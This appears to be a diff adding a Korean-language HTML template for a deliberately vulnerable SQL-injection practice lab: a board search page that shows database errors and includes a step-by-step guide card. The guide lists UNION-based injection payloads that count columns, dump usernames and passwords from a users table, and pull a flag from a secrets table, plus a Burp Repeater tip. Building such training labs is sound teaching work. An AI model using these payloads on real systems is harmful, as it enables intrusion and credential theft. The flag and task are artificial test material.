@@ -1,0 +1,87 @@
+{% extends "base.html" %}
+
+{% block content %}
+<h2>게시판 (검색 기능)</h2>
+<p class="text-muted">Level 2 UNION 기반 SQL Injection의 메인 전장입니다. 검색 기능을 통해 데이터를 대량으로 빼내는 연습을 하세요.</p>
+
+<form class="row g-2 mb-4" method="get">
+    <div class="col-auto">
+        <input type="text" name="q" class="form-control" placeholder="제목/내용 검색 (SQLi 연습)" value="{{ keyword }}">
+    </div>
+    <div class="col-auto">
+        <button class="btn btn-outline-primary" type="submit">검색</button>
+        <a href="/board" class="btn btn-outline-secondary">전체 보기</a>
+    </div>
+</form>
+
+{% if error %}
+<div class="alert alert-danger"><strong>DB 에러:</strong> {{ error }}</div>
+{% endif %}
+
+<table class="table table-hover">
+    <thead>
+        <tr>
+            <th>#</th>
+            <th>제목</th>
+            <th>작성자</th>
+            <th>작성일</th>
+        </tr>
+    </thead>
+    <tbody>
+        {% for p in posts %}
+        <tr>
+            <td>{{ p.id }}</td>
+            <td><a href="/post/{{ p.id }}">{{ p.title }}</a></td>
+            <td>{{ p.nickname }}</td>
+            <td>{{ p.created_at[:10] }}</td>
+        </tr>
+        {% else %}
+        <tr><td colspan="4">게시글이 없습니다.</td></tr>
+        {% endfor %}
+    </tbody>
+</table>
+
+<!-- 친절한 상세 가이드 -->
+<div class="card border-primary mb-3">
+    <div class="card-header bg-primary text-white">
+        <strong>💡 이 페이지에서 UNION SQLi 연습하는 구체적인 방법</strong>
+    </div>
+    <div class="card-body">
+        <div class="row">
+            <div class="col-md-6">
+                <h6 class="text-primary">1. 먼저 컬럼 수를 알아내기 (가장 중요)</h6>
+                <p class="small mb-1">검색창에 아래를 하나씩 넣어보세요:</p>
+                <ul class="small mb-2">
+                    <li><code>' ORDER BY 1--</code></li>
+                    <li><code>' ORDER BY 2--</code></li>
+                    <li><code>' ORDER BY 5--</code> ... 10까지 올려보기</li>
+                </ul>
+                <p class="small">에러가 나는 순간의 직전 숫자가 실제 컬럼 수입니다.</p>
+
+                <h6 class="text-primary mt-3">2. UNION으로 데이터 빼내기</h6>
+                <p class="small">컬럼 수가 6개라고 가정하면:</p>
+                <code class="small d-block mb-1">' UNION SELECT 1,2,3,4,5,6 -- </code>
+                <p class="small mb-1">이제 실제 컬럼으로 교체:</p>
+                <code class="small d-block">' UNION SELECT id,username,password,4,5,6 FROM users -- </code>
+            </div>
+            <div class="col-md-6">
+                <h6 class="text-primary">secrets 테이블에서 플래그 빼내기 (최종 목표)</h6>
+                <div class="small bg-light p-2 rounded mb-2">
+                    <code>' UNION SELECT id,owner,secret,flag,5,6 FROM secrets -- </code>
+                </div>
+                <p class="small mb-2">화면에 <span class="flag">FLAG{SQLi_UNION_is_classic}</span> 같은 값이 보이면 성공!</p>
+
+                <div class="alert alert-warning py-2 small mb-0">
+                    <strong>Burp 팁:</strong> 검색 폼을 한 번 전송 → Burp Repeater로 보내서 <code>q</code> 파라미터만 계속 바꿔가며 공격하세요.<br>
+                    브라우저에서 매번 타이핑하는 것보다 10배는 빠릅니다.
+                </div>
+            </div>
+        </div>
+
+        <hr class="my-2">
+        <p class="small mb-0">
+            더 자세한 단계별 설명은 <a href="/guide" class="fw-bold">📖 학습 가이드 (Level 2)</a> 를 참고하세요.
+        </p>
+    </div>
+</div>
+{% endblock %}
